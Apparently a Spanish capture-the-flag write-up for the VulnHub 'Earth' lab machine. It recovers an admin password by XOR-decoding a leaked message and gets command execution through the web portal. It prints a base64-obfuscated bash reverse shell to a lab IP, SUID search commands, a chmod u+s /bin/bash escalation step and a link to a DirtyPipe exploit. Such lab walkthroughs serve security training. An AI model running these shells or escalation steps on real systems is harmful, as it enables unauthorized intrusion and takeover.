# VULNHUB Earth

Escaneo habitual. Puertos abiertos 22, 80 y 443

El certificado nos devuelve dos dominios, DNS:earth.local, DNS:terratest.earth.local


Se hace FUZZING. Existe terratest.earth.local/robots.txt:

<pre>

Testing secure messaging system notes:
*Using XOR encryption as the algorithm, should be safe as used in RSA.
*Earth has confirmed they have received our sent messages.
*testdata.txt was used to test encryption.
*terra used as username for admin portal.
Todo:
*How do we send our monthly keys to Earth securely? Or should we change keys weekly?
*Need to test different key lengths to protect against bruteforce. How long should the key be?
*Need to improve the interface of the messaging interface and the admin panel, it's currently very basic.

</pre>

Existe testdata.txt 

<pre>
According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth's history, life appeared in the oceans and began to affect Earth's atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.
</pre>

Decodificamos en https://gchq.github.io/CyberChef y la pass es: earthclimatechangebad4humans

Usamos terra:earthclimatechangebad4humans en /admin y tenemos ejecución remota de comandos vía Web.

Nos mandamos consola:

<pre>
echo 'bash -i >& /dev/tcp/192.168.168.212/443 0>&1' | base64 

echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE2OC4yMTIvNDQzIDA+JjEK' | base64 -d | bash

</pre>

Para buscar ficheros con permisos suid

<pre>

find / -perm -u=s -type f 2>/dev/null
find \-perm -4000 2>/dev/null


</pre>

Permisos de superusuario a la consola:

<pre>
#!/bin/bash

chmod u+s /bin/bash
</pre>
Al tener pkexec utilizamos:

https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit

